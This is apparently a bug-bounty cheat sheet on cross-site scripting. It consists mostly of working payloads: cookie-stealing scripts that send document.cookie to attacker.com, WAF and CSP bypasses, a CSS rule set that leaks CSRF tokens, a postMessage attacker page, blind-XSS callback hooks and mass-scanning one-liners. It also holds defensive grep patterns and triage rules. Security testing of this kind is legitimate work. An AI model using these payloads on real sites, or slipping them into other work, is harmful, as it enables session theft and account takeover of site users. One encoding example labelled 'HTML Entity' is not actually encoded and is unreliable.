# XSS (CROSS-SITE SCRIPTING) — UNIFIED MASTER REFERENCE
> Merged from: web2-vuln-classes, telegram-intel, github-x-intel (H1 reports, HolyTips, emadshanab, X tips), bountyforge, bb-methodology
> Last updated: 2026-09-22

---

## QUICK START — 5-MINUTE TEST PLAN

```
[ ] 1. Map ALL input surfaces (URL params, POST body, headers, JSON, websockets, postMessage)
[ ] 2. Identify context: HTML, JS, Attribute, CSS, DOM, postMessage
[ ] 3. Test context-specific payloads (see tables below)
[ ] 4. WAF bypass if blocked (encoding, mutation, alternative tags/handlers)
[ ] 5. Prove impact: exfil cookie/token → ATO, or chain to Critical
```

---

## XSS TYPES & CONTEXTS

| Type | Entry Point | Sink | Test Priority |
|------|-------------|------|---------------|
| **Stored** | DB → rendered later | `innerHTML`, template | 1 (Highest impact) |
| **Reflected** | URL/param → immediate response | Response body | 2 |
| **DOM** | Client-side JS → sinks | `innerHTML`, `eval`, `location` | 3 |
| **postMessage** | Cross-origin message → listener | `innerHTML`, `eval`, `Function` | 4 (Often missed) |
| **CSS Injection** | CSS context → `url()`, `@import` | Attribute selectors | 5 (Bypasses CSP) |
| **mXSS** | Parser differential → mutation | `innerHTML` after sanitization | 6 |
| **Blind/XSS Hunter** | Async contexts (logs, emails, PDFs) | OOB callback | 7 |

---

## CONTEXT-SPECIFIC PAYLOADS

### HTML Context (No Filters)
```html
<script>fetch('//attacker.com/?c='+document.cookie)</script>
<img src=x onerror=fetch('//attacker.com/?c='+document.cookie)>
<svg onload=fetch('//attacker.com/?c='+document.cookie)>
<details open ontoggle=fetch('//attacker.com/?c='+document.cookie)>
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=fetch('//attacker.com/?c='+document.cookie) src=1>
```

### HTML Attribute Context (Inside `value="...", href="...", etc.`)
```html
" onmouseover=fetch('//attacker.com/?c='+document.cookie) "
' onfocus=fetch('//attacker.com/?c='+document.cookie) autofocus>
" onclick=fetch('//attacker.com/?c='+document.cookie) "
```

### JavaScript Context (Inside `<script>`, event handler, JS string)
```javascript
';fetch('//attacker.com/?c='+document.cookie);//
'-fetch('//attacker.com/?c='+document.cookie)-'
`fetch('//attacker.com/?c='+document.cookie)`
</script><script>fetch('//attacker.com/?c='+document.cookie)</script>
```

### DOM Sinks (Grep Targets)
```javascript
// HIGH RISK — Direct execution
innerHTML = userInput
outerHTML = userInput
document.write(userInput)
document.writeln(userInput)
eval(userInput)
setTimeout(userInput, 0)        // string form
setInterval(userInput, 0)       // string form
new Function(userInput)()
element.src = userInput          // javascript: URI
location.href = userInput
location.assign(userInput)
location.replace(userInput)
window.open(userInput)
element.setAttribute('src', userInput)
element.setAttribute('href', userInput)

// MEDIUM RISK — Requires interaction
element.onclick = userInput
element.onerror = userInput
element.onload = userInput
```

### postMessage Source (Cross-Origin)
```javascript
// Listener pattern to find
addEventListener("message", (e) => {
  // Check: e.origin validation?
  sink(e.data)  // innerHTML, eval, etc.
})
```

---

## WAF BYPASS TECHNIQUES (All Sources)

### Tag/Attribute Alternatives (When `<script>` Blocked)
| Blocked | Try Instead |
|---------|-------------|
| `<script>` | `<svg onload=...>`, `<img onerror=...>`, `<details ontoggle=...>` |
| `onerror` | `onload`, `onfocus`, `onmouseover`, `ontoggle`, `onanimationend` |
| `alert()` | `fetch()`, `navigator.sendBeacon()`, `new Image().src=` |
| `(` `)` | `` ` `` (template literal), `throw onerror=alert,1` |

### Encoding Variants (Use `waf_encoder.py --class xss`)
```bash
# HTML Entity
<img src=x onerror=alert(1)>

# Unicode Escape
\u003cimg src=x onerror=alert(1)\u003e

# Base64-wrapped
<svg onload=eval(atob('ZmV0Y2goJy8vYXR0YWNrZXIuY29tLz9jJytkb2N1bWVudC5jb29raWUp'))>

# Hex Encoding
\x3cimg src=x onerror=alert(1)\x3e

# Mixed Case
<SvG oNlOaD=alert(1)>

# Null Byte Injection
<svg%00 onload=alert(1)>

# Double Encoding
%253cimg%2520src%253dx%2520onerror%253dalert(1)%253e
```

### Mutation XSS (mXSS) — Parser Differentials
```html
<!-- Namespace confusion -->
<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>

<!-- Mis-nested tags -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- Table context -->
<table><img src=x onerror=alert(1)></table>

<!-- Template literal in attribute -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
```

### CSP Bypass (When `unsafe-inline` Blocked)
```html
<!-- JSONP endpoint -->
<script src="/api/jsonp?callback=fetch('//attacker.com/?c='+document.cookie)"></script>

<!-- AngularJS template injection -->
{{constructor.constructor('fetch("//attacker.com/?c="+document.cookie)')()}}

<!-- importmap (modern) -->
<script type="importmap-shim">
{"imports": {"x": "//attacker.com/xss.js"}}
</script>
<script type="module">import 'x'</script>

<!-- Service Worker (if controllable) -->
navigator.serviceWorker.register('//attacker.com/sw.js')
```

---

## DOMPURIFY BYPASS HISTORY (BugXplorer #4084)

> Source: https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History

| Class | Technique | Version Affected |
|-------|-----------|------------------|
| **Mutation XSS (mXSS)** | Parser differentials (HTML vs XML parsing) | < 2.0.0 |
| **Clobbering** | `document.forms` / `document.anchors` overwrite | < 2.0.0 |
| **Namespace Confusion** | SVG/MathML in HTML context | < 2.0.0 |
| **Isolated World** | Chrome extension content scripts | < 2.0.0 |
| **Template Literal** | Sanitization bypass via template strings | < 2.3.0 |
| **`:has()` Selector** | Modern DOMPurify CSS selector injection | < 3.0.0 |

**Always check version** — older versions have known CVEs (CVE-2020-6821, CVE-2021-3888, etc.)

---

## CSS INJECTION (BugXplorer #4088, PortSwigger)

> Works **without JavaScript execution**, survives strict CSP

### Attribute Selector Exfiltration
```css
/* Leak CSRF token character by character */
input[name="csrf"][value^="a"] { background: url(//attacker.com/?c=a); }
input[name="csrf"][value^="b"] { background: url(//attacker.com/?c=b); }
/* ... 62 rules for a-zA-Z0-9 */

/* Round 2: value^="aa", value^="ab", etc. */
```

### Opacity Clickjacking
```html
<button style="position:absolute;top:50px;left:50px;">Click me!</button>
<iframe src="https://target.com/account/delete?confirm=1"
        style="position:absolute;top:50px;left:50px;width:200px;height:50px;opacity:0;z-index:9999;">
</iframe>
```

### `@import` Attacker Stylesheet
```css
@import url(https://attacker.com/evil.css);
```

### Font-Based Character Oracle
```css
@font-face { font-family: x; src: url(//attacker.com/?d=5); unicode-range: U+0035; }
```

---

## POSTMESSAGE TESTING (Critical — Often Missed)

### Origin Check Bypass Table
| Weak Check | Bypass | Example |
|------------|--------|---------|
| `e.origin.indexOf("trusted")` | Substring | `https://trusted.attacker.com` |
| `e.origin.startsWith("https://trusted")` | Suffix | `https://trusted.attacker.com` |
| `e.origin.endsWith(".trusted.com")` | Infix | `https://evil-trusted.com` |
| `e.origin === "null"` | Sandboxed iframe | `<iframe srcdoc="...">` |
| Regex unescaped `.` | `.` = any char | `trusted.com` matches `trustedXcom` |
| **Decimal IP normalization** | `2130706433` = `127.0.0.1` | `http://2130706433/.target.com` |

### Finding Listeners
```javascript
// DevTools Console
getEventListeners(window).message

// Source grep
grep -rn "addEventListener.*['\"]message['\"]" --include="*.js" | grep -v node_modules
```

### Attacker Page Template
```html
<iframe src="https://victim.com" id="v"></iframe>
<script>
  document.getElementById('v').onload = () => {
    document.getElementById('v').contentWindow.postMessage(
      '<img src=x onerror=fetch("//attacker.com/?c="+document.cookie)>',
      '*'
    )
  }
</script>
```

### Chains That Pay
```
postMessage → innerHTML/eval sink → DOM XSS                    = High
postMessage → OAuth code/state passing → code theft → ATO      = Critical
postMessage → localStorage token override → session manipulation = High
postMessage → JSON deserialize (eval/Function) → RCE           = Critical (rare)
```

---

## BLIND XSS / XSS HUNTER (Async Contexts)

### Payload for Blind Contexts
```html
"><script src=https://YOUR_XSS_HUNTER_DOMAIN/hook.js></script>
"><img src=x onerror=this.src='https://YOUR_XSS_HUNTER/?c='+document.cookie>
'"><svg onload=fetch('https://YOUR_XSS_HUNTER/?c='+document.cookie)>
```

### Scale Testing (From emadshanab/X)
```bash
# Wayback URLs + XSS Hunter
cat domains.txt | waybackurls | httpx -H "User-Agent: \"><script src=YOUR_XSS_HUNTER></script>"

# Contact forms
site:target.com inurl:"contact" | inurl:"contact-us"
# Fill username with HTML, message with XSS Hunter
```

---

## HIGH-VALUE TARGETS (2025 H1 Reports)

| Target | Vector | Bounty | Chain |
|--------|--------|--------|-------|
| Shopify | Stored XSS via SVG upload | $150 (Medium) | File upload → SVG → XSS |
| Nextcloud | Stored XSS via SVG file | $150 (Medium) | SVG upload |
| Autodesk | Stored XSS in AREA tutorials | High | Persistent XSS |
| Autodesk | Reflected XSS in SVG at area-resources | Medium | SVG parameter |
| TikTok | Stored XSS in backend → PII leak | Medium | Cross-user data |
| Insightly | Stored XSS via LINK name | High | Persistent XSS |
| Insightly | Stored XSS in email notification | Medium | Email trigger |
| Basecamp | Mutation-based stored XSS (Trix Editor) | Critical | mXSS |
| Khan Academy | XSS via legacy "Graphie To Png" API | Critical | Legacy endpoint |
| MainWP | Multiple reflected XSS in notes fields | Low ×5 | Admin panel |

---

## CODE GREP PATTERNS (Source Review)

```bash
# React dangerouslySetInnerHTML
grep -rn "dangerouslySetInnerHTML" --include="*.js" --include="*.tsx"

# Vue v-html
grep -rn "v-html" --include="*.vue"

# Angular [innerHTML]
grep -rn "\[innerHTML\]" --include="*.html" --include="*.ts"

# jQuery .html() / .append()
grep -rn "\.html(\|\.append(" --include="*.js" | grep -v node_modules

# postMessage listeners
grep -rn "addEventListener.*['\"]message['\"]" --include="*.js"

# eval / Function constructor
grep -rn "eval(\|new Function(" --include="*.js"

# setTimeout/Interval string form
grep -rn "setTimeout(.*['\"]\|setInterval(.*['\"]" --include="*.js"

# location.href assignment
grep -rn "location\.href\s*=" --include="*.js"

# document.write
grep -rn "document\.write" --include="*.js"

# InnerHTML/outerHTML assignment
grep -rn "innerHTML\s*=\|outerHTML\s*=" --include="*.js"

# Template engines (SSTI → XSS)
grep -rn "{{.*}}" --include="*.html" --include="*.tpl" --include="*.twig"
```

---

## TRIAGE DECISION TREE

```
1. Does payload execute in victim's browser?
   NO → WAF blocked, no bypass found = N/A
   YES → Continue

2. What context?
   - Stored on sensitive page (admin, banking, PII)     → High
   - Reflected on auth/login page                         → Medium/High
   - DOM XSS via postMessage + OAuth flow                 → Critical (ATO)
   - CSS injection + token exfiltration                   → High
   - Blind XSS in support/admin panel                     → High
   - Self-XSS only (requires victim interaction)          → Low/Info
   - XSS in sandboxed domain (no sensitive data)          → Low/Info

3. Chain potential?
   + CSRF token theft → critical action                  → Critical
   + Service worker persistence                          → Critical
   + Credential theft via fake login                     → Critical
   + Session token exfil → ATO                           → Critical
   + Admin panel access → privilege escalation           → Critical
```

---

## KILL LIST (Auto-Reject)

| Pattern | Reason |
|---------|--------|
| Self-XSS only (no delivery vector) | Requires victim action = Low/Info |
| XSS in out-of-scope domain/subdomain | Not in scope |
| Reflected XSS on 404/error page with no sensitive data | Low/Info |
| DOM XSS sink present but NO user input reaches it | Not exploitable |
| postMessage listener with strict `===` origin check | Not bypassable |
| CSS injection with NO exfil path (no `url()`, `@import`) | N/A |
| Blind XSS with NO callback after 7 days | N/A |
| "Could chain if..." without building chain | Theoretical = N/A |

---

## CHAINS THAT PAY (Escalation)

```
Stored XSS + Admin panel                    → Critical (Privilege escalation)
Reflected XSS + CSRF token theft            → Critical (Bypass CSRF on critical action)
DOM XSS + postMessage + OAuth flow          → Critical (ATO)
CSS Injection + Attribute selector exfil    → High (Token theft under CSP)
XSS + Service Worker registration           → Critical (Persistent XSS)
Blind XSS in support ticket → Admin views   → High (Internal access)
mXSS (DOMPurify bypass) + Stored content    → High/Critical
SVG Upload + XSS                            → Medium/High
XSS → Credential theft via fake login       → Critical (ATO)
```

---

## ONE-LINERS (From emadshanab/X)

```bash
# AngularJS template injection
cat hosts | httpx -path "/?name={{this.constructor.constructor('alert(\"foo\")')()}}" -mr "name={{this.constructor.constructor"

# JavaScript URI in redirect
cat hosts.txt | ffuf -w - -u "FUZZ/sign-in?next=javascript:alert(1);" -mr "javascript:alert(1)"

# Wayback + XSS payload injection
waybackurls target.com | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host; do curl -s "$host" | grep -qs "<script>alert(1)</script>" && echo "VULN: $host"; done

# brutelogic SVG payload
# Add http://brutelogic.com.br/poc.svg to any endpoint

# Content-Type confusion
# Change Content-Type to image/svg-xml and add payload

# XSS via Content-Type bypass
cat hosts | httpx -path "/?x=<svg onload=alert(1)>" -mr "onload=alert"
```

---

## TOOLS (Consolidated)

| Tool | Purpose |
|------|---------|
| `xsser` | Automated XSS scanner |
| `dalfox` | XSS scanner with blind detection |
| `xsstrike` | XSS detection with WAF bypass |
| `xsshunter` / `ezxss` | Blind XSS callback platform |
| `waf_encoder.py` | Generate 20+ XSS variants |
| `postMessage-tracker` (Burp) | Auto-log postMessage |
| `getEventListeners` (DevTools) | Find message listeners |
| `nuclei` templates | XSS templates (cves, generic) |
| `gau`/`waybackurls` | Historical endpoints for blind XSS |
| `qsreplace` | Query param payload injection |
| `ffuf` | Fuzzing with XSS payloads |

---

## REFERENCES (All Sources)

- web2-vuln-classes: Sections 3, 107-238 (comprehensive XSS, postMessage, DOM sinks)
- telegram-intel: @bugbountyusa tips #77, #80, #81, #86; @bugxplorer DOMPurify, CSS injection, postMessage IP
- github-x-intel: HolyTips (no specific XSS checklist but API applies); emadshanab one-liners; H1 reports (Shopify, Nextcloud, Autodesk, TikTok, Basecamp, Khan Academy, MainWP)
- bountyforge: waf-bypass-agent (15 techniques + XSS-specific)
- bb-methodology: Critical Thinking (question trust boundaries), What-If experiments
- PortSwigger: XSS cheat sheet, DOM XSS lab, CSS injection research
- DOMPurify Wiki: Attack Classes & Bypass History
- HackTricks: XSS per context